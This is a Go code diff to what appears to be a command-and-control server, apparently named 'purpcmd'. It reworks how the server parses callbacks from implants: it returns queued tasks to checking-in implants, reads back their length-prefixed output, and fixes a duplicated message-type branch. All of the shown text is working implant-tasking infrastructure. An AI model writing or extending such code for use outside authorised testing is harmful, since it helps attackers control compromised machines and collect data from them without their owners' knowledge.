@@ -9,38 +9,37 @@ import (
 	"io"
 	"net/http"
 	"purpcmd/server/log"
-	//"purpcmd/server/log"
 )
 
-func ParseCallback(d io.ReadCloser, req *http.Request) int {
+func ParseCallback(d io.ReadCloser, req *http.Request) (uint16, []byte) {
 	r := base64.NewDecoder(base64.StdEncoding, d)
 	var messageType uint16
 
 	err := binary.Read(r, binary.BigEndian, &messageType)
 	if err != nil {
 		if err == io.EOF {
-			return NIL
+			return NIL, []byte{}
 		}
 	}
 
 	if messageType == REG {
 		ParseAndReg(r, req)
-		return REG
+		return REG, []byte{}
 	} else if messageType == CHK {
-		err = ParseCheck(r, req)
+		task,err := ParseCheck(r, req)
 		if err != nil {
-			return NIL
+			return NIL, []byte{}
 		}
-		return CHK
-	} else if messageType == CHK {
+		return CHK, task
+	} else if messageType == RSP {
 		err = ParseResponse(r, req)
 		if err != nil {
-			return NIL
+			return NIL,[]byte{}
 		}
-		return CHK
+		return RSP, []byte{}
 	}
 
-	return NIL
+	return NIL, []byte{}
 }
 
 func ParseAndReg(r io.Reader, req *http.Request) error {
@@ -80,7 +79,7 @@ func ParseAndReg(r io.Reader, req *http.Request) error {
 }
 
 // ParseCheck parse health check
-func ParseCheck(r io.Reader, req *http.Request) error {
+func ParseCheck(r io.Reader, req *http.Request) ([]byte, error) {
 	var PID uint32
 	var SessionID uint32
 	var Sleep uint32
@@ -98,17 +97,17 @@ func ParseCheck(r io.Reader, req *http.Request) error {
 	name := fmt.Sprintf("%d", SessionID)
 	imp := ImplantPtrByName(name)
 	if imp == nil {
-		return errors.New("no session with name")
+		return []byte{},errors.New("no session with name")
 	}
 	imp.ImplantUpdateLastseen()
 
 	data, tid, err := imp.ImplantGetTaskStr()
 	if err != nil {
-		return nil
+		return []byte{},nil
 	}
 
 	log.AsyncWriteStdoutInfo(fmt.Sprintf("Sending task %s of %d bytes to %s\n", string(tid[:]), len(data), imp.Name))
-	return nil
+	return []byte(data), nil
 }
 
 func ParseResponse(r io.Reader, req *http.Request) error {
@@ -142,6 +141,13 @@ func ParseResponse(r io.Reader, req *http.Request) error {
 		return errors.New("no task with given id")
 	}
 
-	log.AsyncWriteStdout(fmt.Sprintf("Response - session:%s task:%s\n", name, TaskIDStr))
+	var respLen uint32
+	binary.Read(r, binary.BigEndian, &respLen)
+	respPayload := make([]byte, respLen)
+	binary.Read(r, binary.BigEndian, &respPayload)
+
+	
+
+	log.AsyncWriteStdoutInfo(fmt.Sprintf("Response - session:%s task:%s\n\n%s\n\n", name, TaskIDStr, respPayload))
 	return nil
 }
